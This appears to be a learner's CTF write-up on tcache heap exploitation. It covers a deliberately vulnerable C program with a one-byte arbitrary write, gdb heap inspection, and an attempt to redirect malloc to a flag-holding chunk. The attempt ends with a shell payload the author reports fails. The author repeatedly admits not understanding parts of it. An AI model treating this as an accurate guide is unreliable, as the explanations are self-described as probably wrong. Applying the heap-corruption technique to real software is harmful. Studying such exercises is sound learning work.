# Tcache read

**Note: the information here is probably wrong because I don't completely understand what's going on**

Based off [CTFs/Cache_Me_Outside.md at master · Dvd848/CTFs (github.com)](https://github.com/Dvd848/CTFs/blob/master/2021_picoCTF/Cache_Me_Outside.md)

```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int main(){
    char flag[100] = "poggerspoggerspoggersflagisowo";
    char* ptr = 0;
    char* message = malloc(0x80);
    strcpy(message, flag);
    char* messagex = malloc(0x80);
    strcpy(messagex, flag);
    char* message2 = malloc(0x80);
    strcpy(message2, "Heapowoowowowowowono flag for you");
    free(message);
    free(message2);
    int a = 0;
    int b = 0;
    scanf("%d",&a);
    scanf("%d",&b);
    printf("%lx",(long)a+(long)message); 
    *(char *)((long)a+(long)message) = b;
    char* message3 = malloc(0x80);
    puts((char *)((long)message3+0x10));
    return 0;
}
```

In heap challenges, it is important to know the exact libc version in use as `malloc` and `free` can have different behavior across libc versions.

I used `libc6_2.27-3ubuntu1.2_amd64` which can be downloaded from https://libc.blukat.me/d/libc6_2.27-3ubuntu1.2_amd64.so.

We will need to use [pwninit](https://github.com/io12/pwninit) to setup the environment. We will also use `patchelf` to make sure the binary runs with the correct libc. (If you skipped this step the binary will probably segfault idk)

```shell
$ ls
chal  chal.c libc6_2.27-3ubuntu1.2_amd64.so
$ pwninit
bin: ./chal
libc: ./libc6_2.27-3ubuntu1.2_amd64.so

fetching linker
unstripping libc
setting ./ld-2.27.so executable
$ ls 
chal  chal.c  ld-2.27.so  libc6_2.27-3ubuntu1.2_amd64.so  solve.py
$ patchelf  --set-interpreter ./ld-2.27.so ./chal
$ ./chal
1
1
55c3f10eb2a1wono flag for you
```

Now we've got our environment setup, let's look at the code.

The code `malloc`s a bunch of memory for `char* message`. As you probably know, `malloc` allocates memory on the heap, while if you did something like `char flag[100]` it goes on the stack.

After `malloc`, the flag is copied into the newly allocated memory. Another `char* message2` is also `malloc`ed and a fake flag copied onto it. 

Next, `message` is freed, then `message2` is freed. This is the interesting bit. 

## Tcache

[ref](https://payatu.com/blog/Gaurav-Nayak/introduction-of-tcache-bins-in-heap-management)

\When heap memory is freed, libc puts it in the tcache (thread local cache). Tcache was introduced in glibc 2.26 in 2017 to improve performance. The idea is when you `malloc` again, libc will allocate from tcache first. There are some conditions for whether libc will choose to use memory in tcache but I don't completely understand it. 

If you want to find out how tcache works, you can look at the reference (I probably should). Basically it's just a LIFO data structure (stack). Memory that gets freed last will be reallocated first.

Let's see this in action.

## gdb time

To analyze the heap in gdb, I used this extension to PEDA: [Mipu94/peda-heap: Some new commands debug heap for peda (github.com)](https://github.com/Mipu94/peda-heap)

Pop up gdb and set a breakpoint before and after the `free`s, then run the program.

When the first breakpoint triggers, run `heap all`. You'll see something like this:

```
gdb-peda$ heap all
0x555555559000 SIZE=0x290 DATA[0x555555559010] |................................| INUSED PREV_INUSE
0x555555559290 SIZE=0x90 DATA[0x5555555592a0] |poggerspoggerspoggersflagisowo..| INUSED PREV_INUSE
0x555555559320 SIZE=0x90 DATA[0x555555559330] |poggerspoggerspoggersflagisowo..| INUSED PREV_INUSE
0x5555555593b0 SIZE=0x90 DATA[0x5555555593c0] |Heapowoowowowowowono flag for yo| INUSED PREV_INUSE
0x555555559440 SIZE=0x20bc0 TOP_CHUNK
Last Remainder:  0x0
```

We can see where `malloc` allocated memory in the `DATA[address]` column. We can also see the contents of the memory, such as the `message` and `message2` strings. Let's go to the next breakpoint with `c`. Run `heap all ` and `heap freed` again.

```
gdb-peda$ heap all
0x555555559000 SIZE=0x290 DATA[0x555555559010] |................................| INUSED PREV_INUSE
0x555555559290 SIZE=0x90 DATA[0x5555555592a0] |..UUUU....UUUU..ggersflagisowo..| INUSED PREV_INUSE
0x555555559320 SIZE=0x90 DATA[0x555555559330] |poggerspoggerspoggersflagisowo..| INUSED PREV_INUSE
0x5555555593b0 SIZE=0x90 DATA[0x5555555593c0] |..........UUUU..wono flag for yo| INUSED PREV_INUSE
0x555555559440 SIZE=0x20bc0 TOP_CHUNK
Last Remainder:  0x0

gdb-peda$ heap freed
TCACHE: 0x555555559010
INDEX:0x7 -- SIZE:0x90 -- COUNT: 0x2
0x5555555593b0 SIZE=0x90 DATA[0x5555555593c0] |..UUUU....UUUU..wono flag for yo| INUSED PREV_INUSE
0x555555559290 SIZE=0x90 DATA[0x5555555592a0] |..........UUUU..ggersflagisowo..| INUSED PREV_INUSE
FASTBINS:
UNSORTBINS :
```

We notice that part of the memory has been overwritten. (Note: find out why). When we run `heap freed`, gdb will tell us what's in the tcache and where it is. There are also fastbins and unsortbins but idk what they are.

Anyway, we must remember that tcache is a LIFO stack. So, when we run `malloc` again, the `..........UUUU..wono flag for yo` buffer will be returned, instead of the `message` buffer that we want. 

How can we trick malloc into giving us the `message` buffer instead? Luckily, the code allows us to modify a single byte of memory. As tcache stores the address of freed buffers in memory. By overwriting this address, we can make tcache forget about a freed buffer. 

To make tcache forget about the `no flag for you` buffer, we search the memory for references to the address `0x5555555593c0`:

```
gdb-peda$ find 0x5555555593c0 all
Searching for '0x5555555593c0' in: all ranges
Searching for '0x5555555593c0' in: all ranges
Found 3 results, display max 3 items:
 [heap] : 0x5555555590c8 --> 0x5555555593c0 --> 0x5555555592a0 --> 0x0 
[stack] : 0x7fffffffdb68 --> 0x5555555593c0 --> 0x5555555592a0 --> 0x0 
[stack] : 0x7fffffffdf80 --> 0x5555555593c0 --> 0x5555555592a0 --> 0x0
```

As tcache is a thread local cache, it probably stores stuff in the heap. So we need to overwrite address `0x5555555590c8`. As the program allows to overwrite addresses relative to `message`, which is at `0x5555555592a0` according to `heap all`, we calculate `0x5555555590c8 - 0x5555555592a0 = -472`

So our payload will be 

```
{ echo "-472"; printf "\x00";}  | ./chal
```

but it doesn't work :(